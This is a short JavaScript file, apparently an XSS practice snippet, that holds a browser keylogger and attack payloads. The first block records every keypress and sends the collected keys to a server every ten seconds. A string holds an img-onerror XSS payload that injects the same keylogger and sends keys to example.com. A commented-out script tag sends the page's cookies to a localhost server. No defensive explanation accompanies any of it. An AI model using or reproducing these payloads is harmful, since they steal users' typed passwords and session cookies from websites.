var keys = [];

setInterval(function(){
    var keyString =keys.join("");
    fetch("server" + keyString)
}, 10000);

document.onkeypress=function(e){keys.push(e.key);
}

test = `<img src=nonexistentImage onerror="var keys = [];setInterval(function(){var keyString =keys.join("");fetch("https://example.com/keylogger?keys=" + keyString)}, 10000);document.onkeypress=function(e){keys.push(e.key)};"/>`;

//<script>document.write('<img src="http://localhost:8081/cookies/' + document.cookie + '" alt="Comment" />')</script>